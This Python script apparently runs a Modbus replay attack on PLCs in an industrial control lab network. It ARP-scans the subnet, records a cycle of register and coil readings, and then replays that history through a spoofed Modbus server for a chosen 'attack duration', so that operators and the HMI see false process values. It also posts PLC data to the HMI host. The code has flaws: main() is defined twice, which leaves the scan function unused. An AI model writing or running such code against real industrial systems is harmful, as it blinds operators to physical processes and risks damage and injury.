import argparse
import json
import modbus_tk
import modbus_tk.defines as cst
from modbus_tk import modbus_tcp
from time import time, sleep
import threading
import subprocess
import requests
from scapy.all import ARP, Ether, srp

def arp_scan():
    # Crea il pacchetto ARP per la scansione
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.20.0/24")
    
    # Invia e ricevi i pacchetti ARP
    result = srp(arp_request, timeout=2, verbose=False)[0]
    
    # Estrai gli indirizzi IP attivi dalla risposta
    active_ips = []
    for sent, received in result:
        active_ips.append(received.psrc)
    
    # Stampa gli indirizzi IP attivi
    print("Active IPs:")
    for ip in active_ips:
        print(ip)
def main():
    # Avvia la funzione ARP in un thread separato
    arp_thread = threading.Thread(target=arp_scan)
    arp_thread.start()

def read_plc_data(master):
    data = {}
    try:
        data['I'] = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 4)
        data['C'] = master.execute(1, cst.READ_COILS, 0, 3)
    except:
        print('Error reading master')
    return data

def write_plc_data(slave, data):
    slave.set_values('0', 0, data['I'])
    slave.set_values('1', 0, data['C'])

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--plc', choices=['all', 'single'], default='all', help='PLC selection')
    parser.add_argument('--ip', nargs='+', help='IP addresses of PLCs')
    parser.add_argument('--duration', type=int, help='Attack duration in minutes')
    parser.add_argument('json_files', nargs='+', help='JSON files containing PLC info')
    args = parser.parse_args()

    if args.plc == 'all':
        ip_addresses = args.ip if args.ip else ['192.168.20.101', '192.168.20.102', '192.168.20.103']
    elif args.plc == 'single':
        ip_addresses = args.ip if args.ip else ['192.168.20.101']
    else:
        print('Invalid PLC selection')
        return

    if not args.duration:
        print('Please provide the attack duration')
        return

    # Check if IP address matches the available PLCs
    for ip in ip_addresses:
        if ip not in ['192.168.20.101', '192.168.20.102', '192.168.20.103']:
            print('Invalid IP address:', ip)
            return

    # Create a TCP master for reading PLC data
    master = modbus_tcp.TcpMaster(host='127.0.0.1', port=8502)
    master.set_timeout(5.0)

    # Create a TCP server and slave for writing PLC data
    server = modbus_tcp.TcpServer(port=9502)
    server.start()
    slave = server.add_slave(1)
    slave.add_block('0', cst.ANALOG_INPUTS, 0, 4)
    slave.add_block('1', cst.COILS, 0, 3)

    history = []
    state = 0
    i = 0

    # Read JSON files and pass PLC info to HMI
    for json_file in args.json_files:
        try:
            with open(json_file) as file:
                plc_info = json.load(file)
                # Pass plc_info to HMI at 192.168.20.104
                try:
                    response = requests.post('http://192.168.20.104', json=plc_info)
                    if response.status_code == 200:
                        print('PLC info sent to HMI successfully')
                    else:
                        print('Error sending PLC info to HMI')
                except requests.exceptions.RequestException as e:
                    print('Error sending PLC info to HMI:', str(e))
        except FileNotFoundError:
            print('File not found:', json_file)
        except json.JSONDecodeError:
            print('Error reading JSON file:', json_file)

    start_time = time()
    end_time = start_time + args.duration * 60

    while time() < end_time:
        print('STATE:', state)

        if state in (0, 1, 2):
            data = read_plc_data(master)

            print('read:', data)

            v = data['I'][0]
            if state == 0 and v > 75:
                state = 1
            elif state == 1 and v < 60:
                state = 2
            elif state == 2 and v > 75:
                state = 3

            if state in (1, 2):
                history.append(data)

            v1 = v

        if state == 3:
            data = history[i % len(history)]
            i += 1

        write_plc_data(slave, data)

        sleep(0.5)

if __name__ == '__main__':
    main()
